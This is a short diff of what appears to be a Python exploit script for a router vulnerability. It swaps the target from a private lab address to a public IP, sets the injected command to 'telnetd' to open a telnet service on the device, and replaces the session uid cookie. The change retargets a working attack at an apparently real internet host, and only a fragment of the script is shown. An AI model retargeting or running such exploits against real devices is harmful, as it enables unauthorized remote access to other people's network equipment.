@@ -1,4 +1,4 @@
-# -*- coding:utf-8 -*-
+	# -*- coding:utf-8 -*-
 # Acknowledgement
 # Thanks to the partners who discovered the vulnerability together：
 # Wei Xie
@@ -16,10 +16,10 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 import re
 
-url = 'http://192.168.0.1/'
+url = 'http://66.201.54.1/'
 print("Exploit continuing...")
 COMMAND = 'telnetd'
-uid = 'b8gh3GJptw'         ###update it!!!!!
+uid = 'kL5awxyQm9'         ###update it!!!!!
 session = requests.Session()
 session.verify = False
 session.cookies.update({"uid": uid})
